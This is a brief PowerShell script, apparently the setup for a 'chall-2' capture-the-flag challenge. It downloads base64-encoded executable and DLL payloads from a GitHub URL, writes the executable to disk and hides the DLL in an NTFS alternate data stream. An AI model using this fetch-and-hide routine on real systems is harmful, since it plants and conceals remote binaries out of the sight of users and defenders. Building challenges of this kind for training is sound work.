$Web = New-Object System.Net.WebClient
$ExeLink = "https://raw.githubusercontent.com/meliodaaz/public/main/chall-2/enc/exeb64.txt"
$DllLink = "https://raw.githubusercontent.com/meliodaaz/public/main/chall-2/enc/dllb64.txt"
$ExE = $Web.DownloadString($ExeLink)
$ExE = [System.Convert]::FromBase64String($ExE)

$Dll = $Web.DownloadString($DllLink)
$Dll = [System.Convert]::FromBase64String($Dll)

$target = "chall"

Set-Content -Path $target -Value $ExE -Encoding Byte
Set-Content -Path $target -Value $Dll -Stream "nothing" -Encoding Byte
